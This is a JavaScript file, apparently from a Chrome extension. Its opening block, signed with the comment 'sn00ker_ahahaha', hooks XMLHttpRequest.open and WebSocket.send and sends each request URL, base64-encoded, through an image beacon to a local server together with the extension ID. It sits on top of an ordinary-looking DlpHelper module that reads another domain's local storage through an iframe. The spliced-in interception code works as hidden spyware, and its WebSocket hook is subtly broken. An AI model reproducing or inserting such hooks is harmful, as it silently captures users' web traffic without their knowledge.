function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
'use strict';
var DlpHelper;
(function (DlpHelper) {
    function openDLPDomain(url, getLocalStorage, parseLocalStorage, resolve, reject) {
        var bgifr = document.createElement("iframe");
        bgifr.setAttribute("id", "bgifr");
        bgifr.setAttribute("src", url);
        document.body.appendChild(bgifr);
        var _this = this;
        _this.defer(function () {
            var bgifr = document.getElementById("bgifr");
            document.body.removeChild(bgifr);
        });
        var onConnect = function (port) {
            if (!port.sender.hasOwnProperty("tab")) {
                chrome.runtime.onConnect.removeListener(onConnect);
                _this.defer(function () { port.disconnect(); });
                getLocalStorage(port, _this.keys).then(function (response) {
                    _this.cleanUp();
                    if (response && response.toolbarData) {
                        Logger.log("dlpHelper: openDLPDomain: SUCCESS: response looked like: " + JSON.stringify(response));
                        resolve(parseLocalStorage(response));
                    }
                    else {
                        Logger.log("dlpHelper: openDLPDomain: FAIL: response looked like: " + JSON.stringify(response));
                        reject(new Error("dlpHelper: openDLPDomain: FAILED to find DLP data in local storage"));
                    }
                }).catch(function (err) {
                    _this.cleanUp();
                    reject(err);
                });
            }
        };
        _this.defer(function () {
            chrome.runtime.onConnect.removeListener(onConnect);
        });
        chrome.runtime.onConnect.addListener(onConnect);
    }
    DlpHelper.openDLPDomain = openDLPDomain;
})(DlpHelper || (DlpHelper = {}));
